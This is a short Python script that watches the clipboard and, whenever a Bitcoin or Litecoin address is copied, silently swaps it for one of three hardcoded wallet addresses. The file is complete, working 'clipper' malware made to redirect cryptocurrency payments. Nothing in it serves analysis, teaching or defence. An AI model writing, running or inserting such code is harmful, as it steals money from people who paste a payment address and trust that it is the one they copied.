import re
import time
import pyperclip

rules = [
    {"name": "BTC", "reg": "^1[a-zA-HJ-NP-Z0-9]{25,39}$", "value": "19hdEPSFQ4iUhtWoXHqg2E1kPCpUmaEgP8"},
    {"name": "BTC", "reg": "^bc1[a-zA-HJ-NP-Z0-9]{25,39}$", "value": "bc1qwenpr55ekcs3a46ly4hqkjn652sppttdnsszhd"},
    {"name": "LTC", "reg": "^L[a-zA-HJ-NP-Z0-9]{26,41}$", "value": "LXnj7XNxmRkTnEbdDzKd7QfZSGaEriFu4m"}
]
while True:
    text = pyperclip.paste()
    for rule in rules:
        if re.fullmatch(rule["reg"], text):
            pyperclip.copy(re.sub(rule["reg"], rule["value"], text))
            break
    time.sleep(0.25)
